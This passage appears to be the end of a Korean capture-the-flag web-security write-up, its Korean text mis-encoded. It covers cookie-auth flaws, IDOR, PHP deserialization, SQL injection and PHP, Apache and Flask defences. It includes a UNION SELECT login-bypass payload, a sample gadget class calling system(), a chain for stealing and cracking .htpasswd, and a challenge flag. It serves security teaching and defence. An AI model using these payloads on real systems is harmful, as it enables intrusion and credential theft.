1.  **ì•ˆì „í•œ ì§ë ¬í™” ëŒ€ì•ˆ ì‚¬ìš©**: `unserialize()` ëŒ€ì‹  `json_decode()`ì™€ ê°™ì€ ë°ì´í„° ê¸°ë°˜ í˜•ì‹ì„ ì‚¬ìš©í•œë‹¤.
2.  **ê°•ë ¥í•œ í•´ì‹œ ì•Œê³ ë¦¬ì¦˜ ì ìš©**: ë¹„ë°€ë²ˆí˜¸ ì €ì¥ ì‹œ DESë‚˜ MD5 ëŒ€ì‹  SHA-256 ì´ìƒì˜ ì•Œê³ ë¦¬ì¦˜ê³¼ ê³ ìœ í•œ ì†”íŠ¸(Salt)ë¥¼ ì ìš©í•´ì•¼ í•œë‹¤.
3.  **ë””ë ‰í† ë¦¬ ë³´ì•ˆ ê°•í™”**: ìœ ì¶” ê°€ëŠ¥í•œ íŒŒì¼ëª… ì‚¬ìš©ì„ ê¸ˆì§€í•˜ê³ , ì›¹ ì„œë²„ ì„¤ì •ì—ì„œ ë””ë ‰í† ë¦¬ ë¦¬ìŠ¤íŒ…(`Options -Indexes`)ì„ ë°˜ë“œì‹œ ì°¨ë‹¨í•´ì•¼ í•œë‹¤.

**FLAG**: `151af6b8359aef91193796d8a77b0e53`

---

## í•µì‹¬ ê°œë… ì •ë¦¬

### 1. ì¿ í‚¤ ê¸°ë°˜ ì¸ì¦ì˜ ì·¨ì•½ì 

ì¿ í‚¤ëŠ” í´ë¼ì´ì–¸íŠ¸ ì¸¡ì— ì €ì¥ë˜ëŠ” ë°ì´í„°ë¡œ, ì‚¬ìš©ìê°€ ì™„ì „íˆ ì œì–´í•  ìˆ˜ ìˆë‹¤.

#### ì·¨ì•½í•œ ì¿ í‚¤ íŒ¨í„´:

```php
// âŒ ë‚˜ìœ ì˜ˆ 1: í‰ë¬¸ ì €ì¥
setcookie("user_role", "admin");

// âŒ ë‚˜ìœ ì˜ˆ 2: ë‹¨ìˆœ ì¸ì½”ë”©
setcookie("user_id", base64_encode("admin"));

// âŒ ë‚˜ìœ ì˜ˆ 3: ì˜ˆì¸¡ ê°€ëŠ¥í•œ í•´ì‹±
setcookie("token", md5($username));
```

#### ì•ˆì „í•œ ì¿ í‚¤ íŒ¨í„´:

```php
// âœ… ì„œë²„ ì„¸ì…˜ ì‚¬ìš©
session_start();
$_SESSION['user_id'] = $user_id;
$_SESSION['role'] = $role;

// âœ… ì„œëª…ëœ ì¿ í‚¤ (JWT ë°©ì‹)
$payload = json_encode(['user' => 'admin', 'exp' => time() + 3600]);
$signature = hash_hmac('sha256', $payload, SECRET_KEY);
$jwt = base64_encode($payload) . '.' . $signature;
setcookie("auth_token", $jwt);

// ê²€ì¦ ì‹œ
list($payload, $signature) = explode('.', $_COOKIE['auth_token']);
if(hash_hmac('sha256', $payload, SECRET_KEY) !== $signature) {
    die("Invalid token");
}
```

### 2. IDOR (Insecure Direct Object Reference)

ì‚¬ìš©ìê°€ ì§ì ‘ ê°ì²´ ì‹ë³„ìë¥¼ ì¡°ì‘í•˜ì—¬ ê¶Œí•œ ì—†ëŠ” ë¦¬ì†ŒìŠ¤ì— ì ‘ê·¼í•˜ëŠ” ì·¨ì•½ì .

#### ì·¨ì•½í•œ ì½”ë“œ:

```php
// âŒ ê¶Œí•œ ê²€ì¦ ì—†ìŒ
$post_id = $_GET['id'];
$post = $db->query("SELECT * FROM posts WHERE id = $post_id");
echo $post['content'];
```

#### ì•ˆì „í•œ ì½”ë“œ:

```php
// âœ… ì†Œìœ ê¶Œ ê²€ì¦
$post_id = $_GET['id'];
$user_id = $_SESSION['user_id'];
$post = $db->query(
    "SELECT * FROM posts WHERE id = ? AND author_id = ?",
    [$post_id, $user_id]
);

if(!$post) {
    die("Access denied");
}

// âœ… UUID ì‚¬ìš©
// ìˆ«ì ID ëŒ€ì‹  ì˜ˆì¸¡ ë¶ˆê°€ëŠ¥í•œ UUID ì‚¬ìš©
// ì˜ˆ: /post/550e8400-e29b-41d4-a716-446655440000
```

### 3. PHP Object Injection

PHPì˜ `unserialize()` í•¨ìˆ˜ê°€ ì‚¬ìš©ì ì…ë ¥ì„ ì‹ ë¢°í•  ë•Œ ë°œìƒí•˜ëŠ” ì¹˜ëª…ì  ì·¨ì•½ì .

#### ì§ë ¬í™” ë¬¸ìì—´ êµ¬ì¡°:

```
O:5:"Admin":2:{s:2:"id";s:5:"admin";s:2:"pw";s:5:"guest";}
â”‚ â”‚  â”‚      â”‚
â”‚ â”‚  â”‚      â””â”€ ì†ì„± ê°œìˆ˜
â”‚ â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€ í´ë˜ìŠ¤ëª… ê¸¸ì´
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ í´ë˜ìŠ¤ëª…
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ê°ì²´ íƒ€ì…

ì†ì„± êµ¬ì¡°:
s:2:"id";     s:5:"admin";
â”‚ â”‚  â”‚        â”‚ â”‚  â”‚
â”‚ â”‚  â”‚        â”‚ â”‚  â””â”€ ê°’
â”‚ â”‚  â”‚        â”‚ â””â”€â”€â”€â”€ ê°’ ê¸¸ì´
â”‚ â”‚  â”‚        â””â”€â”€â”€â”€â”€â”€ íƒ€ì…
â”‚ â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ í‚¤
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ í‚¤ ê¸¸ì´
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ íƒ€ì…
```

#### Magic Methods (ìë™ ì‹¤í–‰):

```php
class Exploit {
    private $cmd;

    function __construct() {
        // ê°ì²´ ìƒì„± ì‹œ
    }

    function __wakeup() {
        // unserialize() ì§í›„
        system($this->cmd);
    }

    function __destruct() {
        // ê°ì²´ ì†Œë©¸ ì‹œ
        file_put_contents($this->filename, $this->content);
    }

    function __toString() {
        // ë¬¸ìì—´ë¡œ ë³€í™˜ ì‹œ
        return $this->data;
    }
}
```

### 4. SQL Injectionì„ í†µí•œ ì¸ì¦ ìš°íšŒ

#### UNION SELECT ë°ì´í„° ìœ„ì¡°:

```sql
-- ì›ë³¸ ì¿¼ë¦¬
SELECT id, pw FROM users WHERE id = '$id'

-- ê³µê²© í˜ì´ë¡œë“œ
id = none' UNION SELECT 'admin', '1234' #

-- ìµœì¢… ì¿¼ë¦¬
SELECT id, pw FROM users WHERE id = 'none'
UNION SELECT 'admin', '1234' #'

-- ê²°ê³¼ì…‹
id     | pw
-------|------
admin  | 1234  (ê°€ì§œ ë°ì´í„°!)
```

### 5. ì·¨ì•½ì  ì²´ì´ë‹ (Vulnerability Chaining)

ì—¬ëŸ¬ ì·¨ì•½ì ì„ ì—°ê²°í•˜ì—¬ ìµœì¢… ëª©í‘œ ë‹¬ì„±:

```
[1ë‹¨ê³„] Unserialize ì·¨ì•½ì 
   â†“
[2ë‹¨ê³„] íŒŒì¼ ì½ê¸° (__destruct)
   â†“
[3ë‹¨ê³„] .htpasswd íƒˆì·¨
   â†“
[4ë‹¨ê³„] ë¹„ë°€ë²ˆí˜¸ í¬ë˜í‚¹ (John the Ripper)
   â†“
[5ë‹¨ê³„] ì¸ì¦ ìš°íšŒ
   â†“
[6ë‹¨ê³„] ìˆ¨ê²¨ì§„ íŒŒì¼ ë°œê²¬ (MD5 í•´ì‹œëª…)
   â†“
[7ë‹¨ê³„] ìµœì¢… FLAG íšë“
```

---

## ë°©ì–´ ê¸°ë²•

### 1. ì•ˆì „í•œ ì„¸ì…˜ ê´€ë¦¬

```php
// âœ… ì„œë²„ ì‚¬ì´ë“œ ì„¸ì…˜
session_start();
session_regenerate_id(true);  // ì„¸ì…˜ ê³ ì • ê³µê²© ë°©ì§€

// ì„¸ì…˜ ì„¤ì • ê°•í™”
ini_set('session.cookie_httponly', 1);  // XSS ë°©ì§€
ini_set('session.cookie_secure', 1);    // HTTPS only
ini_set('session.cookie_samesite', 'Strict');  // CSRF ë°©ì§€
ini_set('session.use_strict_mode', 1);

// ê¶Œí•œ ì €ì¥
$_SESSION['user_id'] = $user_id;
$_SESSION['role'] = $role;
$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
$_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'];

// ì„¸ì…˜ ê²€ì¦
if($_SESSION['ip'] !== $_SERVER['REMOTE_ADDR']) {
    session_destroy();
    die("Session hijacking detected");
}
```

### 2. IDOR ë°©ì–´

```php
// âœ… ë°©ë²• 1: ì†Œìœ ê¶Œ ê²€ì¦
function checkOwnership($resource_id, $user_id) {
    $stmt = $pdo->prepare(
        "SELECT * FROM resources WHERE id = ? AND owner_id = ?"
    );
    $stmt->execute([$resource_id, $user_id]);

    if(!$stmt->fetch()) {
        http_response_code(403);
        die("Access denied");
    }
}

// âœ… ë°©ë²• 2: UUID ì‚¬ìš©
// CREATE TABLE posts (
//     id CHAR(36) PRIMARY KEY DEFAULT (UUID()),
//     ...
// )

// âœ… ë°©ë²• 3: ì ‘ê·¼ ì œì–´ ë¦¬ìŠ¤íŠ¸ (ACL)
function checkPermission($user_id, $resource_id, $action) {
    $stmt = $pdo->prepare(
        "SELECT * FROM permissions
         WHERE user_id = ? AND resource_id = ? AND action = ?"
    );
    $stmt->execute([$user_id, $resource_id, $action]);
    return $stmt->fetch() !== false;
}
```

### 3. Unserialize ë°©ì–´

```php
// âŒ ì ˆëŒ€ í•˜ì§€ ë§ ê²ƒ
$data = unserialize($_COOKIE['user_data']);

// âœ… ë°©ë²• 1: JSON ì‚¬ìš©
$data = json_decode($_COOKIE['user_data'], true);
if(json_last_error() !== JSON_ERROR_NONE) {
    die("Invalid data");
}

// âœ… ë°©ë²• 2: í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ ê²€ì¦
$data = unserialize($_COOKIE['user_data']);
if(!($data instanceof AllowedClass)) {
    die("Invalid object type");
}

// âœ… ë°©ë²• 3: PHP 7.0+ allowed_classes
$data = unserialize(
    $_COOKIE['user_data'],
    ['allowed_classes' => ['User', 'Session']]
);

// âœ… ë°©ë²• 4: ì„œëª… ê²€ì¦
function sign($data, $key) {
    $serialized = serialize($data);
    $signature = hash_hmac('sha256', $serialized, $key);
    return base64_encode($serialized . '|' . $signature);
}

function unsign($signed, $key) {
    $decoded = base64_decode($signed);
    list($serialized, $signature) = explode('|', $decoded);

    if(hash_hmac('sha256', $serialized, $key) !== $signature) {
        throw new Exception("Invalid signature");
    }

    return unserialize($serialized);
}
```

### 4. ë¹„ë°€ë²ˆí˜¸ ì €ì¥

```php
// âŒ ì·¨ì•½í•œ ë°©ì‹
$hash = md5($password);
$hash = sha1($password);

// âœ… ì•ˆì „í•œ ë°©ì‹
$hash = password_hash($password, PASSWORD_ARGON2ID, [
    'memory_cost' => 2048,
    'time_cost' => 4,
    'threads' => 3
]);

// ê²€ì¦
if(password_verify($input_password, $stored_hash)) {
    // ì¸ì¦ ì„±ê³µ

    // í•´ì‹œ ì•Œê³ ë¦¬ì¦˜ ì—…ê·¸ë ˆì´ë“œ í•„ìš” ì‹œ
    if(password_needs_rehash($stored_hash, PASSWORD_ARGON2ID)) {
        $new_hash = password_hash($input_password, PASSWORD_ARGON2ID);
        // DB ì—…ë°ì´íŠ¸
    }
}
```

### 5. ì¸ì¦ ë¡œì§ ê°•í™”

```python
# Python Flask ì˜ˆì‹œ
from flask import session, request, abort
from functools import wraps

def require_auth(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            abort(401)
        return f(*args, **kwargs)
    return decorated_function

def require_role(role):
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            if session.get('role') != role:
                abort(403)
            return f(*args, **kwargs)
        return decorated_function
    return decorator

@app.route('/admin')
@require_auth
@require_role('admin')
def admin_panel():
    return "Admin dashboard"
```

### 6. htpasswd ë³´ì•ˆ ê°•í™”

```apache
# .htaccess
AuthType Basic
AuthName "Restricted Area"
AuthUserFile /var/www/.htpasswd_secure  # ì›¹ ë£¨íŠ¸ ë°–ì— ì €ì¥
Require valid-user

# ë””ë ‰í† ë¦¬ ë¦¬ìŠ¤íŒ… ì°¨ë‹¨
Options -Indexes

# ë¯¼ê°í•œ íŒŒì¼ ì ‘ê·¼ ì°¨ë‹¨
<FilesMatch "\.(htpasswd|htaccess|env|git)$">
    Require all denied
</FilesMatch>
```

```bash
# ê°•ë ¥í•œ í•´ì‹œë¡œ .htpasswd ìƒì„±
htpasswd -B -C 12 .htpasswd_secure username
# -B: bcrypt ì‚¬ìš©
# -C 12: cost factor (ë†’ì„ìˆ˜ë¡ ì•ˆì „í•˜ì§€ë§Œ ëŠë¦¼)
```

---

## ì°¸ê³  ìë£Œ

### OWASP ê°€ì´ë“œ

- **OWASP Top 10 2021**: [A01:2021 â€“ Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- **OWASP Top 10 2021**: [A07:2021 â€“ Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
- **Session Management Cheat Sheet**: [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- **PHP Object Injection**: [OWASP](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)

### PortSwigger Academy

- **Authentication vulnerabilities**: [Web Security Academy](https://portswigger.net/web-security/authentication)
- **Access control vulnerabilities**: [Web Security Academy](https://portswigger.net/web-security/access-control)
- **Insecure deserialization**: [Web Security Academy](https://portswigger.net/web-security/deserialization)

### ì¶”ê°€ í•™ìŠµ ìë£Œ

- **PHP Manual**: [unserialize() function](https://www.php.net/manual/en/function.unserialize.php)
- **PHP Magic Methods**: [Documentation](https://www.php.net/manual/en/language.oop5.magic.php)
- **IDOR Explained**: [HackTricks](https://book.hacktricks.xyz/pentesting-web/idor)

### ë„êµ¬

- **John the Ripper**: Password cracking tool
- **Burp Suite**: Web application security testing
- **OWASP ZAP**: Security scanner

---

**ë¬¸ì œ ìˆ˜**: 7ê°œ
**ë‚œì´ë„ ë¶„í¬**: ğŸŸ¢ Beginner 2ê°œ | ğŸŸ¡ Intermediate 3ê°œ | ğŸ”´ Advanced 2ê°œ
**ì´ í•™ìŠµ ì‹œê°„**: ì•½ 5ì‹œê°„ 20ë¶„

**ë§ˆì§€ë§‰ ì—…ë°ì´íŠ¸**: 2026-01-14
**ë²„ì „**: 1.0
